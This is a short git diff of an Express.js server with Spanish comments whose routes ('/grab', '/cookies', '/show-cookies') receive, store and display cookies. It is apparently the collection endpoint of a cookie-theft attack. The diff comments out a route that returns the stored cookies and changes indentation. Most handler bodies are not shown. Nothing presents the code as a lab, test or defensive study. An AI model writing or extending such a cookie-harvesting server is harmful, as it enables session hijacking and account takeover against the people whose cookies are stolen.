@@ -21,9 +21,9 @@ app.get('/grab', (req, res) => {
 });
 
 // Ruta para leer las cookies almacenadas
-app.get('/read', (req, res) => {
-    res.send(cookiesAlmacenadas);
-});
+//app.get('/read', (req, res) => {
+    //res.send(cookiesAlmacenadas);
+//});
 
 // Ruta para recibir y almacenar cookies
 app.get('/cookies', (req, res) => {
@@ -35,7 +35,7 @@ app.get('/cookies', (req, res) => {
 
 // Ruta para mostrar las cookies almacenadas
 app.get('/show-cookies', (req, res) => {
-    res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
+  res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
 });
 
 // Iniciar el servidor
